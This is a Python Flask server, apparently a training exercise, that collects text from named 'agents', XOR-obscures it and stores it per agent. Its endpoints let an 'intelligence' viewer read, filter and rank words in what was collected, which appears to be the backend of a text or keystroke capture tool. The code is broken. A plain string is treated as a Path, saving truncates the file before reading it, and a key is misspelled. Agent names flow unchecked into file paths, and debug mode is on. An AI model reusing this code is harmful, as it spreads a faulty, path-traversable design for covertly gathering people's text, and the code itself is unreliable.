import json, os
import re
from typing import Counter
from flask import Flask, jsonify, request
from flask_cors import CORS
from Xor_2 import xor_on_key
from datetime import datetime
from pathlib import Path

base_path = Path("/home/user/files/data.json")  # נתיב כללי


app = Flask(__name__)
CORS(app)

json_file = r"C:\Users\menachem shoval\Desktop\myTestRepo1\kodcod1\DB\data_3.json"

def open_file(agent_name, data=None):
    current_path = json_file.with_stem(agent_name)
    current_path.touch(exist_ok=True)
    
    if data:
        with open(current_path, 'w', encoding='utf-8') as file:
            try:
                if os.stat(current_path).st_size > 0:
                    my_dict = json.load(file)
                    my_dict.extend(data)
                else:
                    my_dict = data
                json.dump(my_dict, file, ensure_ascii=False)
                return True
            except:
                return False
    else:
        with open(current_path, 'r', encoding='utf-8') as file:
            try:
                my_dict = json.load(file)
            except:
                my_dict = None
        return my_dict



@app.route('/save_data', methods=['POST'])
def save_data():
    """
    Get data from agent and save it per a minute in json file
    """
    data = request.get_json()

    if not data:
        return jsonify({"status": "empty"})
    
    for item in data[1:]:
        item["text"] = xor_on_key(item["text"], 7)

    result = open_file(data[0]["mame"], data[1:])

    return jsonify({"status": result})


@app.route('/', methods=['GET'])
def get_full_data():
    """
    function allows to intelligence person see all the data from the json  file
    """

    agent = request.get_json()["name"]

    my_dict = open_file(agent)
    
    if my_dict:
        return jsonify(my_dict[::-1])
    
    return jsonify({"status": "empty"})


@app.route('/filter/date', methods=['POST'])
def filter_by_date():
    """
        function to filter the data by months and/or days.
        the function should recive information in the following format:
        body : { name: "name", from_year : "2025", from_month : "05", from_day : "18", to_year : "2025", to_month : "08", to_day : "26" }
    """

    date = request.get_json()
    from_date_str = f"{date['from_year']}-{date['from_month']}-{date['from_day']}"
    to_date_str = f"{date['to_year']}-{date['to_month']}-{date['to_day']}"

    from_date = datetime.strptime(from_date_str, "%Y-%m-%d")
    to_date = datetime.strptime(to_date_str, "%Y-%m-%d")

    agent_file = json_file.with_stem(date["name"])

    if not os.path.exists(agent_file) or os.stat(agent_file).st_size == 0:
        return jsonify({"status": "empty"})

    with open(agent_file, 'r', encoding='utf-8') as file:
        try:
            my_dict = json.load(file)
        except json.JSONDecodeError:
            my_dict = []

    result = []
    for item in my_dict:
        try:
            item_date = datetime.strptime(item["date"], "%m/%d/%y")
            if from_date <= item_date <= to_date:
                result.append(item)
        except Exception as e:
            return jsonify({"Error": e})

    return jsonify(result[::-1])




@app.route('/filter/string', methods=['POST'])
def filter_by_string():
    """
    function to filter the data by specified word.
    the function should recive information in the following format: body : { word : "some_string" } 
    -- without speaces!
    """
    string = request.get_json()
    word = string.get('word')
    result = []
    agent_file = json_file.with_stem(string.get('name'))
    if not os.path.exists(agent_file) or os.stat(agent_file).st_size == 0:
        return jsonify({"status": "empty"})
    else:
        with open(agent_file, 'r', encoding='utf-8') as file:
            try:
                my_dict = json.load(file)
            except json.JSONDecodeError:
                return jsonify({"status": "error"})
    for item in my_dict:
        if word in item["text"]:
            result.append(item)
    if result:
        return jsonify(result[::-1])
    return jsonify({"status": "empty"})


@app.route('/top_words', methods=['GET'])
def get_most_frequent_words():
    """
    Returns the most frequent words from the 'text' field.
    The number of words to return can be specified with a 'limit' query parameter.
    """
    limit = request.args.get('limit', default=10, type=int)
    name = request.args.get('name', type=str)
    agent_file = json_file.with_stem(name)

    if not os.path.exists(agent_file) or os.stat(agent_file).st_size == 0:
        return jsonify({"status": "empty", "message": "No data found."})

    try:
        with open(agent_file, 'r', encoding='utf-8') as file:
            data = json.load(file)
    except json.JSONDecodeError:
        return jsonify({"status": "error", "message": "Failed to decode JSON."})

    all_words = []
    for item in data:
        text = item.get("text", "")
        words = _get_clean_words(text)
        all_words.extend(words)

    word_counts = Counter(all_words)

    top_words = word_counts.most_common(limit)

    result = [{"word": word, "count": count} for word, count in top_words]

    return jsonify(result)

def _get_clean_words(text):
    """
    Helper function to clean a string from punctuation and normalize it.
    """
    text = text.lower()
    text = re.sub(r'[^a-z0-9א-ת\s]', '', text)
    words = text.split()
    return [word for word in words if word]


if __name__ == '__main__':
    app.run(debug=True, port=5000)